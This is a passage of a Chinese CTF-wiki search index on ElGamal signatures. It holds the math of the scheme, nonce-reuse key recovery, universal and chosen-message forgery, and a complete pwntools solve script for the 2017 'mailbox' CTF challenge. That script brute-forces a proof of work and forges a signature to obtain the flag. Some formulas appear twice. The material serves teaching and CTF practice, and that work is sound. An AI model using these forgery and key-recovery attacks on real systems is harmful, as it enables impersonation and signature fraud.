450\n\n\n\u901a\u7528\u4f2a\u9020\u7b7e\u540d\n\n\n\u539f\u7406\n\n\n\u5728\u653b\u51fb\u8005\u77e5\u9053\u4e86\u67d0\u4e2a\u4ebaAlice\u7684\u516c\u94a5\u4e4b\u540e\uff0c\u4ed6\u53ef\u4ee5\u4f2a\u9020Alice\u7684\u7b7e\u540d\u4fe1\u606f\u3002\u5177\u4f53\u539f\u7406\u5982\u4e0b\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\uff0cAlice\u7684\u516c\u94a5\u4e3a{p,g,y}\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4f2a\u9020\n\n\n\n\n\n\n\u9009\u62e9\u6574\u6570 i\uff0cj\uff0c\u5176\u4e2d\ngcd(j,p-1)=1\ngcd(j,p-1)=1\n \u3002\n\n\n\n\n\n\n\u8ba1\u7b97\u7b7e\u540d\uff0c\nr \\equiv g^iy^j \\bmod p\nr \\equiv g^iy^j \\bmod p\n \uff0c\ns\\equiv -rj^{-1} \\bmod p-1\ns\\equiv -rj^{-1} \\bmod p-1\n\n\n\n\n\n\n\u8ba1\u7b97\u6d88\u606f\uff0c\nm\\equiv si \\bmod p-1\nm\\equiv si \\bmod p-1\n\n\n\n\n\n\n\u90a3\u4e48\u6b64\u65f6\u751f\u6210\u7684\u7b7e\u540d\u4e0e\u6d88\u606f\u5c31\u662f\u53ef\u4ee5\u88ab\u6b63\u5e38\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5177\u4f53\u63a8\u5bfc\u5982\u4e0b\n\n\ny^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p\ny^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p\n\n\n\u53c8\u7531\u4e8e\u6d88\u606fm\u7684\u6784\u9020\u65b9\u5f0f\uff0c\u6240\u4ee5\n\n\n\n\n\ng^{si} \\equiv g^m \\bmod p-1\n\n\n\n\ng^{si} \\equiv g^m \\bmod p-1\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\u7684\u6d88\u606f\uff0c\u4f46\u662f\u4ed6\u5374\u65e0\u6cd5\u4f2a\u9020\u6307\u5b9a\u683c\u5f0f\u7684\u6d88\u606f\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u64cd\u4f5c\uff0c\u8fd9\u4e00\u653b\u51fb\u5c31\u4e0d\u518d\u53ef\u884c\u3002\n\n\n\u5df2\u77e5\u7b7e\u540d\u4f2a\u9020\n\n\n\u53c2\u8003pdf\u3002\n\n\n\u9009\u62e9\u7b7e\u540d\u4f2a\u9020\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6211\u4eec\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f97\u5230\u7b7e\u540d\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u65b0\u7684\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u591f\u9009\u62e9\u7b7e\u540d\u7684\u6d88\u606f\u4f2a\u9020\u7b7e\u540d\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u6211\u4eec\u77e5\u9053\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u5982\u4e0b\n\n\ng^m \\equiv y^rr^s \\bmod p\ng^m \\equiv y^rr^s \\bmod p\n \n\n\n\u90a3\u4e48\u53ea\u8981\u6211\u4eec\u9009\u62e9\u4e00\u4e2a\u6d88\u606fm\u4f7f\u5176\u548c\u6211\u4eec\u6240\u8981\u4f2a\u9020\u7684\u6d88\u606fm\u2018\u6a21p-1\u540c\u4f59\uff0c\u7136\u540e\u540c\u65f6\u4f7f\u7528\u6d88\u606fm\u7684\u7b7e\u540d\u5373\u53ef\u7ed5\u8fc7\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u4ee52017\u5e74\u56fd\u8d5bmailbox\u4e3a\u4f8b\uff0c\ni\u6625\u79cb\u6709\u590d\u73b0\n\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u8fdb\u884cproof of work\n\n\n    \nproof\n \n=\n \nb64\n.\nb64encode\n(\nos\n.\nurandom\n(\n12\n))\n\n    \nreq\n.\nsendall\n(\n\n        \nPlease provide your proof of work, a sha1 sum ending in 16 bit\ns set to 0, it must be of length \n%d\n bytes, starting with \n%s\n\\n\n \n%\n \n(\n\n        \nlen\n(\nproof\n)\n \n+\n \n5\n,\n \nproof\n))\n\n\n    \ntest\n \n=\n \nreq\n.\nrecv\n(\n21\n)\n\n    \nha\n \n=\n \nhashlib\n.\nsha1\n()\n\n    \nha\n.\nupdate\n(\ntest\n)\n\n\n    \nif\n \n(\ntest\n[\n0\n:\n16\n]\n \n!=\n \nproof\n \nor\n \nord\n(\nha\n.\ndigest\n()[\n-\n1\n])\n \n!=\n \n0\n \nor\n \nord\n(\nha\n.\ndigest\n()[\n-\n2\n])\n \n!=\n \n0\n):\n \n# or ord(ha.digest()[-3]) != 0 or ord(ha.digest()[-4]) != 0):\n\n        \nreq\n.\nsendall\n(\nCheck failed\n)\n\n        \nreq\n.\nclose\n()\n\n        \nreturn\n \n\n\n\u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u4ee5proof\u5f00\u5934\u7684\u957f\u5ea6\u4e3aproof\u957f\u5ea6\u52a05\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5176sha1\u7684\u503c\u4ee516\u6bd4\u7279\u76840\u7ed3\u675f\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u3002\n\n\ndef\n \nf\n(\nx\n):\n\n    \nreturn\n \nsha1\n(\nprefix\n \n+\n \nx\n)\n.\ndigest\n()[\n-\n2\n:]\n \n==\n \n\\0\\0\n\n\n\n\nsh\n \n=\n \nremote\n(\n106.75.66.195\n,\n \n40001\n)\n\n\n# bypass proof\n\n\nsh\n.\nrecvuntil\n(\nstarting with \n)\n\n\nprefix\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n\nprint\n \nstring\n.\nascii_letters\n\n\ns\n \n=\n \nutil\n.\niters\n.\nmbruteforce\n(\nf\n,\n \nstring\n.\nascii_letters\n \n+\n \nstring\n.\ndigits\n,\n \n5\n,\n \nfixed\n)\n\n\ntest\n \n=\n \nprefix\n \n+\n \ns\n\n\nsh\n.\nsendline\n(\ntest\n)\n\n\n\n\n\n\u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\u4e2d\u7684util.iters.mbruteforce\uff0c\u8fd9\u662f\u4e00\u4e2a\u5229\u7528\u7ed9\u5b9a\u5b57\u7b26\u96c6\u5408\u4ee5\u53ca\u6307\u5b9a\u957f\u5ea6\u8fdb\u884c\u591a\u7ebf\u7a0b\u7206\u7834\u7684\u51fd\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7206\u7834\u51fd\u6570\uff0c\u8fd9\u91cc\u662fsha1\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u96c6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u8282\u6570\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u6307\u7684\u662f\u6211\u4eec\u53ea\u5c1d\u8bd5\u5b57\u8282\u6570\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u5b57\u8282\u6570\u7684\u6392\u5217\uff0c\u5373\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\u3002\u66f4\u52a0\u5177\u4f53\u7684\u4fe1\u606f\u8bf7\u53c2\u8003pwntools\u3002\n\n\n\u7ed5\u8fc7\u4e4b\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u5206\u6790\u7a0b\u5e8f\uff0c\u7b80\u5355\u770b\u4e0bgenerate_keys\u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u51fd\u6570\u662fElGamal\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u770b\u4e86\u770bverify\u51fd\u6570\uff0c\u5c31\u662f\u9a8c\u8bc1\u7b7e\u540d\u7684\u8fc7\u7a0b\u3002\n\n\n\u7ee7\u7eed\u5206\u6790\n\n\n            \nif\n \nlen\n(\nmsg\n)\n \n \nMSGLENGTH\n:\n\n                \nreq\n.\nsendall\n(\nwhat r u do\nin?\n)\n\n                \nreq\n.\nclose\n()\n\n                \nreturn\n\n            \nif\n \nmsg\n[:\n4\n]\n \n==\n \ntest\n:\n\n                \nr\n,\n \ns\n \n=\n \nsign\n(\ndigitalize\n(\nmsg\n),\n \nsk\n,\n \npk\n,\n \np\n,\n \ng\n)\n\n                \nreq\n.\nsendall\n(\nYour signature is\n \n+\n \nrepr\n((\nhex\n(\nr\n),\n \nhex\n(\ns\n)))\n \n+\n \n\\n\n)\n\n            \nelse\n:\n\n                \nif\n \nmsg\n \n==\n \nTh3_bery_un1que1i_ChArmIng_G3nji\n \n+\n \ntest\n:\n\n                    \nreq\n.\nsendall\n(\nSignature:\n)\n\n                    \nsig\n \n=\n \nself\n.\nrfile\n.\nreadline\n()\n.\nstrip\n()\n\n                    \nif\n \nlen\n(\nsig\n)\n \n \nMSGLENGTH\n:\n\n                        \nreq\n.\nsendall\n(\nwhat r u do\nin?\n)\n\n                        \nreq\n.\nclose\n()\n\n                        \nreturn\n\n                    \nsig_rs\n \n=\n \nsig\n.\nsplit\n(\n,\n)\n\n                    \nif\n \nlen\n(\nsig_rs\n)\n \n \n2\n:\n\n                        \nreq\n.\nsendall\n(\nyo what?\n)\n\n                        \nreq\n.\nclose\n()\n\n                        \nreturn\n\n                    \n# print \nGot sig\n, sig_rs\n\n                    \nif\n \nverify\n(\ndigitalize\n(\nmsg\n),\n \nint\n(\nsig_rs\n[\n0\n]),\n \nint\n(\nsig_rs\n[\n1\n]),\n \npk\n,\n \np\n,\n \ng\n):\n\n                        \nreq\n.\nsendall\n(\nLogin Success.\n\\n\nDr. Ziegler has a message for you: \n \n+\n \nFLAG\n)\n\n                        \nprint\n \nshipped flag\n\n                        \nreq\n.\nclose\n()\n\n                        \nreturn\n\n                    \nelse\n:\n\n                        \nreq\n.\nsendall\n(\nYou are not the Genji I knew!\n\\n\n)\n\n\n\n\n\n\u6839\u636e\u8fd9\u4e09\u4e2aif\u6761\u4ef6\u53ef\u4ee5\u77e5\u9053\n\n\n\n\n\u6211\u4eec\u7684\u6d88\u606f\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7MSGLENGTH\uff0c40000\u3002\n\n\n\u6211\u4eec\u53ef\u4ee5\u5bf9\u6d88\u606f\u5f00\u5934\u4e3atest\u7684\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u3002\n\n\n\u6211\u4eec\u9700\u8981\u4f7f\u5f97\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\uff0c\u4ee5\u6211\u4eec\u7ed5\u8fc7proof\u7684test\u4e3a\u7ed3\u5c3e\u7684\u6d88\u606f\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u63d0\u4f9b\u7b7e\u540d\u7684\u503c\u3002\n\n\n\n\n\u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5c31\u77e5\u9053\u4e86\uff0c\u6211\u4eec\u5c31\u662f\u5728\u9009\u62e9\u6307\u5b9a\u7b7e\u540d\u8fdb\u884c\u4f2a\u9020\uff0c\u8fd9\u91cc\u6211\u4eec\u81ea\u7136\u8981\u5145\u5206\u5229\u7528\u7b2c\u4e8c\u4e2aif\u6761\u4ef6\uff0c\u53ea\u8981\u6211\u4eec\u786e\u4fdd\u6211\u4eec\u8f93\u5165\u7684\u6d88\u606f\u7684\u5f00\u5934\u4e3a\u2018test\u2019\uff0c\u5e76\u4e14\u8be5\u6d88\u606f\u4e0e\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u6a21p-1\u540c\u4f59\uff0c\u6211\u4eec\u5373\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\n\n\n\u90a3\u6211\u4eec\u5982\u4f55\u6784\u9020\u5462\uff1f\u65e2\u7136\u6d88\u606f\u7684\u957f\u5ea6\u53ef\u4ee5\u8db3\u591f\u957f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06'test'\u5bf9\u5e94\u768416\u8fdb\u5236\u5148\u5de6\u79fb\u5f97\u5230\u6bd4p-1\u5927\u7684\u6570\u5b57a\uff0c\u7136\u540e\u7528a\u5bf9p-1\u53d6\u6a21\uff0c\u7528a\u518d\u51cf\u53bb\u4f59\u6570\uff0c\u6b64\u65f6a\u6a21p-1\u4f590\u4e86\u3002\u8fd9\u65f6\u518d\u52a0\u4e0a\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u7684\u503c\uff0c\u5373\u5b9e\u73b0\u4e86\u6a21p-1\u540c\u4f59\u3002\n\n\n\u5177\u4f53\u5982\u4e0b\n\n\n# construct the message begins with \ntest\n\n\ntarget\n \n=\n \nTh3_bery_un1que1i_ChArmIng_G3nji\n \n+\n \ntest\n\n\npart1\n \n=\n \n(\ndigitalize\n(\ntest\n \n+\n \nos\n.\nurandom\n(\n51\n))\n \n \n512\n)\n \n//\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\np\n \n-\n \n1\n)\n\n\nvictim\n \n=\n \npart1\n \n+\n \ndigitalize\n(\ntarget\n)\n\n\nwhile\n \n1\n:\n\n    \ntmp\n \n=\n \nhex\n(\nvictim\n)[\n2\n:]\n.\ndecode\n(\nhex\n)\n\n    \nif\n \ntmp\n.\nstartswith\n(\ntest\n)\n \nand\n \n\\n\n \nnot\n \nin\n \ntmp\n:\n\n        \nbreak\n\n    \nelse\n:\n\n        \npart1\n \n=\n \n(\ndigitalize\n(\ntest\n \n+\n \nos\n.\nurandom\n(\n51\n))\n \n \n512\n)\n \n//\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\n\n            \np\n \n-\n \n1\n)\n\n        \nvictim\n \n=\n \npart1\n \n+\n \ndigitalize\n(\ntarget\n)\n\n\n\n\n\n\u6700\u540e\u7684\u811a\u672c\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nhashlib\n \nimport\n \nsha1\n\n\nimport\n \nstring\n\n\nimport\n \nast\n\n\nimport\n \nos\n\n\nimport\n \nbinascii\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\n\n\ndef\n \nf\n(\nx\n):\n\n    \nreturn\n \nsha1\n(\nprefix\n \n+\n \nx\n)\n.\ndigest\n()[\n-\n2\n:]\n \n==\n \n\\0\\0\n\n\n\n\ndef\n \ndigitalize\n(\nm\n):\n\n    \nreturn\n \nint\n(\nm\n.\nencode\n(\nhex\n),\n \n16\n)\n\n\n\n\nsh\n \n=\n \nremote\n(\n106.75.66.195\n,\n \n40001\n)\n\n\n# bypass proof\n\n\nsh\n.\nrecvuntil\n(\nstarting with \n)\n\n\nprefix\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n\nprint\n \nstring\n.\nascii_letters\n\n\ns\n \n=\n \nutil\n.\niters\n.\nmbruteforce\n(\nf\n,\n \nstring\n.\nascii_letters\n \n+\n \nstring\n.\ndigits\n,\n \n5\n,\n \nfixed\n)\n\n\ntest\n \n=\n \nprefix\n \n+\n \ns\n\n\nsh\n.\nsendline\n(\ntest\n)\n\n\n\nsh\n.\nrecvuntil\n(\nCurrent PK we are using: \n)\n\n\npubkey\n \n=\n \nast\n.\nliteral_eval\n(\nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n))\n\n\np\n \n=\n \npubkey\n[\n0\n]\n\n\ng\n \n=\n \npubkey\n[\n1\n]\n\n\npk\n \n=\n \npubkey\n[\n2\n]\n\n\n\n# construct the message begins with \ntest\n\n\ntarget\n \n=\n \nTh3_bery_un1que1i_ChArmIng_G3nji\n \n+\n \ntest\n\n\npart1\n \n=\n \n(\ndigitalize\n(\ntest\n \n+\n \nos\n.\nurandom\n(\n51\n))\n \n \n512\n)\n \n//\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\np\n \n-\n \n1\n)\n\n\nvictim\n \n=\n \npart1\n \n+\n \ndigitalize\n(\ntarget\n)\n\n\nwhile\n \n1\n:\n\n    \ntmp\n \n=\n \nhex\n(\nvictim\n)[\n2\n:]\n.\ndecode\n(\nhex\n)\n\n    \nif\n \ntmp\n.\nstartswith\n(\ntest\n)\n \nand\n \n\\n\n \nnot\n \nin\n \ntmp\n:\n\n        \nbreak\n\n    \nelse\n:\n\n        \npart1\n \n=\n \n(\ndigitalize\n(\ntest\n \n+\n \nos\n.\nurandom\n(\n51\n))\n \n \n512\n)\n \n//\n \n(\np\n \n-\n \n1\n)\n \n*\n \n(\n\n            \np\n \n-\n \n1\n)\n\n        \nvictim\n \n=\n \npart1\n \n+\n \ndigitalize\n(\ntarget\n)\n\n\n\nassert\n \n(\nvictim\n \n%\n \n(\np\n \n-\n \n1\n)\n \n==\n \ndigitalize\n(\ntarget\n)\n \n%\n \n(\np\n \n-\n \n1\n))\n\n\n\n# get victim signature\n\n\nsh\n.\nsendline\n(\nhex\n(\nvictim\n)[\n2\n:]\n.\ndecode\n(\nhex\n))\n\n\nsh\n.\nrecvuntil\n(\nYour signature is\n)\n\n\nsig\n \n=\n \nast\n.\nliteral_eval\n(\nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n))\n\n\nsig\n \n=\n \n[\nint\n(\nsig\n[\n0\n],\n \n0\n),\n \nint\n(\nsig\n[\n1\n],\n \n0\n)]\n\n\n\n# get flag\n\n\nsh\n.\nsendline\n(\ntarget\n)\n\n\nsh\n.\nsendline\n(\nstr\n(\nsig\n[\n0\n])\n \n+\n \n,\n \n+\n \nstr\n(\nsig\n[\n1\n]))\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u8fd8\u8981\u8bf4\u51e0\u4e2a\u6709\u610f\u601d\u7684\u70b9\u5c31\u662f\n\n\n\n\nint(x,0)\u53ea\u7684\u662f\u5c06x\u6309\u7167\u5176\u5b57\u9762\u5bf9\u5e94\u7684\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4int('0x12',0)=18\uff0c\u8fd9\u91cc\u76f8\u5e94\u7684\u5b57\u9762\u5fc5\u987b\u6709\u5bf9\u5e94\u6807\u5fd7\u5f00\u5934\uff0c\u6bd4\u5982\u8bf4\u5341\u516d\u8fdb\u5236\u662f0x,8\u8fdb\u5236\u662f0\uff0c\u4e8c\u8fdb\u5236\u662f0b\u3002\u56e0\u4e3a\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u8bc6\u522b\u4e86\u3002\n\n\npython(python2) \u91cc\u9762\u5230\u5e95\u591a\u5927\u7684\u6570\uff0c\u8ba1\u7b97\u51fa\u6765\u6700\u540e\u624d\u4f1a\u5e26\u6709L\u5462\uff1f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u4e8eint\u90fd\u4f1a\u6709L\u3002\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684victim\u786e\u5b9e\u662f\u6ca1\u6709\u7684\uff0c\uff0c \n\u4e00\u4e2a\u95ee\u9898\uff0c\u5f85\u89e3\u51b3\u3002\u3002", 
            "title": "ElGamal \u6570\u5b57\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/elgamal/#elgamal", 
            "text": "RSA\u7684\u6570\u5b57\u7b7e\u540d\u65b9\u6848\u51e0\u4e4e\u4e0e\u5176\u52a0\u5bc6\u65b9\u6848\u5b8c\u5168\u4e00\u81f4\uff0c\u53ea\u662f\u5229\u7528\u79c1\u94a5\u8fdb\u884c\u4e86\u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5bf9\u4e8eElGamal\u6765\u8bf4\uff0c\u5176\u7b7e\u540d\u65b9\u6848\u4e0e\u76f8\u5e94\u7684\u52a0\u5bc6\u65b9\u6848\u5177\u6709\u5f88\u5927\u533a\u522b\u3002", 
            "title": "ElGamal"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_1", 
            "text": "", 
            "title": "\u57fa\u672c\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_2", 
            "text": "\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b   \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff08\u5341\u8fdb\u5236\u4f4d\u6570\u4e0d\u4f4e\u4e8e160\uff09\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p  \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002  \u9009\u53d6 Z_p^* Z_p^*  \u7684\u751f\u6210\u5143g\u3002  \u968f\u673a\u9009\u53d6\u6574\u6570d, 0\\leq d \\leq p-2 0\\leq d \\leq p-2  \uff0c\u5e76\u8ba1\u7b97 g^d \\equiv y \\bmod p g^d \\equiv y \\bmod p  \u3002   \u5176\u4e2d\u79c1\u94a5\u4e3a{d}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002", 
            "title": "\u5bc6\u94a5\u751f\u6210"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_3", 
            "text": "A\u9009\u53d6\u968f\u673a\u6570 k \\in Z_{p-1} k \\in Z_{p-1}  \uff0c\u5e76\u4e14gcd(k,p-1)=1\uff0c\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d  $ sig_d(m,k)=(r,s)$   \u5176\u4e2d r \\equiv g^k \\bmod p r \\equiv g^k \\bmod p  \uff0c s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1  \u3002", 
            "title": "\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_4", 
            "text": "\u5982\u679c  g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p  \uff0c\u90a3\u4e48\u9a8c\u8bc1\u6210\u529f\uff0c\u5426\u5219\u9a8c\u8bc1\u5931\u8d25\u3002\u8fd9\u91cc\u9a8c\u8bc1\u6210\u529f\u7684\u539f\u7406\u5982\u4e0b\uff0c\u9996\u5148\u6211\u4eec\u6709   \ny^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks}  \ny^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks}   \u53c8\u56e0\u4e3a   \ns \\equiv (m-dr)k^{-1} \\bmod p-1  \ns \\equiv (m-dr)k^{-1} \\bmod p-1   \u6240\u4ee5   \nks \\equiv m-dr \\bmod p-1  \nks \\equiv m-dr \\bmod p-1   \u8fdb\u800c   \nks+dr=a*(p-1)+m  \nks+dr=a*(p-1)+m   \u6240\u4ee5   \ng^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m  \ng^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m   \u6240\u4ee5\u6839\u636e\u8d39\u9a6c\u5b9a\u7406\uff0c\u53ef\u5f97   \ng^{ks+dr} \\equiv g^m \\bmod p  \ng^{ks+dr} \\equiv g^m \\bmod p", 
            "title": "\u9a8c\u8bc1"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_5", 
            "text": "\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86r,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684k\u3002", 
            "title": "\u96be\u70b9"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_6", 
            "text": "", 
            "title": "\u5e38\u89c1\u653b\u51fb"
        }, 
        {
            "location": "/crypto/signature/elgamal/#p", 
            "text": "", 
            "title": "p\u592a\u5c0f"
        }, 
        {
            "location": "/crypto/signature/elgamal/#k", 
            "text": "", 
            "title": "\u968f\u673a\u6570k\u590d\u7528"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_7", 
            "text": "\u5982\u679c\u7b7e\u540d\u8005\u590d\u7528\u4e86\u968f\u673a\u6570k\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u5177\u4f53\u7684\u539f\u7406\u5982\u4e0b\uff1a  \u5047\u8bbe\u76ee\u524d\u6709\u4e24\u4e2a\u7b7e\u540d\u90fd\u662f\u4f7f\u7528\u540c\u4e00\u4e2a\u968f\u673a\u6570\u8fdb\u884c\u7b7e\u540d\u7684\u3002\u90a3\u4e48\u6211\u4eec\u6709   \nr \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1  \nr \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1   \u8fdb\u800c\u6709   \ns_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1  \ns_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1   \u4e24\u5f0f\u76f8\u51cf   \nk(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1  \nk(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1   \u8fd9\u91cc\uff0c s_1,s_2,m_1,m_2,p-1 s_1,s_2,m_1,m_2,p-1  \u5747\u5df2\u77e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7b97\u51fak\u3002\u5f53\u7136\uff0c\u5982\u679c gcd(s_1-s_2,p-1)!=1 gcd(s_1-s_2,p-1)!=1  \u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8fd9\u65f6\u6211\u4eec\u53ea\u9700\u8981\u591a\u8bd5\u4e00\u8bd5\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636es\u7684\u8ba1\u7b97\u65b9\u6cd5\u5f97\u5230\u79c1\u94a5d\uff0c\u5982\u4e0b   \nd \\equiv \\frac{m-ks}{r}  \nd \\equiv \\frac{m-ks}{r}", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_8", 
            "text": "2016 LCTF Crypto 450", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_9", 
            "text": "", 
            "title": "\u901a\u7528\u4f2a\u9020\u7b7e\u540d"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_10", 
            "text": "\u5728\u653b\u51fb\u8005\u77e5\u9053\u4e86\u67d0\u4e2a\u4ebaAlice\u7684\u516c\u94a5\u4e4b\u540e\uff0c\u4ed6\u53ef\u4ee5\u4f2a\u9020Alice\u7684\u7b7e\u540d\u4fe1\u606f\u3002\u5177\u4f53\u539f\u7406\u5982\u4e0b  \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\uff0cAlice\u7684\u516c\u94a5\u4e3a{p,g,y}\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4f2a\u9020    \u9009\u62e9\u6574\u6570 i\uff0cj\uff0c\u5176\u4e2d gcd(j,p-1)=1 gcd(j,p-1)=1  \u3002    \u8ba1\u7b97\u7b7e\u540d\uff0c r \\equiv g^iy^j \\bmod p r \\equiv g^iy^j \\bmod p  \uff0c s\\equiv -rj^{-1} \\bmod p-1 s\\equiv -rj^{-1} \\bmod p-1    \u8ba1\u7b97\u6d88\u606f\uff0c m\\equiv si \\bmod p-1 m\\equiv si \\bmod p-1    